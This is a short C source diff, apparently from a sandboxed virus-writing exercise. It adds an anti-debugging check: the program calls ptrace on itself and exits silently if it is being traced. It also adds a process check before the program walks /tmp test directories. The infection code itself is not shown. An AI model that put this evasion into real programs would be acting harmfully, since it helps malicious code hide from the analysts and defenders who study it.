@@ -1,5 +1,12 @@
 #include "../famine.h"
 
+void	check_debugger(void)
+{
+	if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) //0
+		exit(0);
+	ptrace(PTRACE_DETACH, 0, 0, 0); //17
+}
+
 void	process_directory(char *dir_name)
 {
 	DIR				*stream;
@@ -22,6 +29,8 @@ void	process_directory(char *dir_name)
 
 int 	main(void)
 {
+	check_debugger();
+	check_proc();
 	process_directory("/tmp/test");
 	process_directory("/tmp/test2");
 	return (0);
